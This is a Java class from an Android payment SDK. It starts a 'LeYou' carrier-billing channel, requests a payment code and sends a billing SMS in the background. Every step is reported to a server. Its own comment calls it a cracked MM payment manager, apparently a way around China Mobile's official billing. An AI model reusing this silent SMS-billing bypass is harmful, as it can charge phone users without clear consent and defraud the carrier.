package mobi.zty.pay.sdk.leyouFee;

import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.iap.youshu.IAPMTKPayment;
import com.iap.youshu.PaymentInfo;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class LeYouFeeInstance extends PaymentInterf{
	private Map<String, Boolean> channelInitMap = new HashMap<String, Boolean>();
	private static LeYouFeeInstance instance;
	private Handler callBHandler = null;
	private String payCode;
	public static LeYouFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized LeYouFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new LeYouFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
		FeeInfo info = (FeeInfo) parameters[1];
		String channelId = info.sdkPayInfo.spChannel;
		if (!(channelInitMap.containsKey(channelId)&&channelInitMap.get(channelId))) {
			initChannel(context, channelId);
		}
	}
	private synchronized void initChannel(Context context, String channelId) {
		try {
			PaymentInfo.Init(context, channelId);
			channelInitMap.put(channelId, true);
		} catch (Exception e) {
			channelInitMap.put(channelId, false);
			e.printStackTrace();
		}
	}

	@Override
	public synchronized void pay(final Context context, Object... parameters) {
		final FeeInfo feeInfo =  (FeeInfo) parameters[0];
		if (feeInfo==null||feeInfo.sdkPayInfo==null) {
			notiFyResult(PayConfig.SDK_INFO_NULL, "后台没给计费点","");
			Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE, "后台没给计费点", "0000000000");
			return;
		};
		payCode = feeInfo.sdkPayInfo.payCode;
		final String orderId = feeInfo.orderId;
		final String channelId = feeInfo.sdkPayInfo.spChannel;
		Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE, "参数赋值完毕", orderId);
		if (!(channelInitMap.containsKey(channelId)&&channelInitMap.get(channelId))) {
			Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE, "新渠道需再次初始化！"+channelId, orderId);
			initChannel(context, channelId);
		}
		if (!(channelInitMap.containsKey(channelId)&&channelInitMap.get(channelId))) {
			notiFyResult(PayConfig.SP_INIT_FAIL, "leyou初始化失败", orderId);
			Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE,"渠道初始化失败！"+channelId, orderId);
			return;
		}
		payCode = String.format("%s%02d", feeInfo.sdkPayInfo.appId,(Integer.parseInt(payCode)));
			new Thread(new Runnable() {
				@Override
				public void run() {
					PayResultInfo info = new PayResultInfo();
					info.orderId = orderId;
					try {
						Looper.prepare();
						Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE, 
								"执行支付！"+"payCode="+payCode+"appID="+feeInfo.sdkPayInfo.appId+"channelId="+channelId, orderId);
						IAPMTKPayment payment = IAPMTKPayment.doMTK102OpertionRequest
								(payCode,orderId,feeInfo.sdkPayInfo.appId,channelId,PaymentInfo.getTelecom());
						boolean isSendScc = true;
						if (payment.getResult() == 0||payment.getResult() ==1) {
							if (payment.getResult() ==1) {
								info.resutCode = PayConfig.BIIL_SUCC;
								info.retMsg = "支付成功！";
								Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
								message.obj = info;
								message.sendToTarget();
								Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE,
										"乐游告知直接成功", orderId);
							}else{
								Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
								itSend.putExtra("fee_index", orderId);
						        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
						        payment.sendSms(mSendPI, null);
						        Util_G.debugE("l_pay", "mm_pay_data-> index =="+orderId);
						        Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE,
										"执行发送短信", orderId);
							}
							
						}else{
							
							isSendScc = false;
						}
						if (!isSendScc) {
							info.resutCode = PayConfig.SP_PAY_FAIL;
							info.retMsg = "获取指令失败"+payment.getResult();
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE,
									info.retMsg, orderId);
							return;
						}
					} catch (Exception e) {
						info.resutCode = PayConfig.SP_PAY_EXPTION;
						info.retMsg = "调用支付时代码异常";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						e.printStackTrace();
					}
				}
			}).start();
	}
	private void notiFyResult(int resutCode,String retMsg,String orderId) {
		PayResultInfo info = new PayResultInfo();
		info.resutCode = resutCode;
		info.retMsg = retMsg;
		Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		message.obj = info;
		message.sendToTarget();
	}
}
